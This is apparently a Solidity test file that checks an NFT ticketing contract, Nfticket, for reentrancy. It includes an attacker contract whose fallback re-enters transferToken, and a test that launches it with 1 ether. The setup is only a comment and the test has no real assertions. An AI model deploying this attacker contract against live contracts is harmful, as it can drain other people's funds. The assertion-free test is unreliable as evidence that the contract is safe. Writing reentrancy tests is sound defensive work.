// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Import the Nfticket contract
import "./Nfticket.sol";

// Malicious contract attempting reentrancy
contract MaliciousContract {
    Nfticket public nfticket;

    constructor(address _nfticketAddress) {
        nfticket = Nfticket(_nfticketAddress);
    }

    // Fallback function used to perform the reentrancy attack
    receive() external payable {
        // Attempt to re-enter the transferToken function
        nfticket.transferToken(payable(address(this)), 1);
    }

    function attack() external payable {
        // Initial call to transferToken to start the attack
        nfticket.transferToken{value: msg.value}(payable(address(this)), 1);
    }
}

// Test contract
contract ReentrancyTest {
    Nfticket public nfticket;
    MaliciousContract public attacker;

    function beforeEach() public {
        // Deploy the Nfticket contract
        nfticket = new Nfticket(address(this));
        // Deploy the malicious contract
        attacker = new MaliciousContract(address(nfticket));
    }

    function testReentrancyAttack() public {
        // Set up the Nfticket contract (e.g., mint an NFT, set prices, etc.)

        // Attempt the attack
        attacker.attack{value: 1 ether}();

        // Assertions to check the state of the Nfticket contract after the attack
        // e.g., assert that balances, ownership, etc., are as expected
    }
}
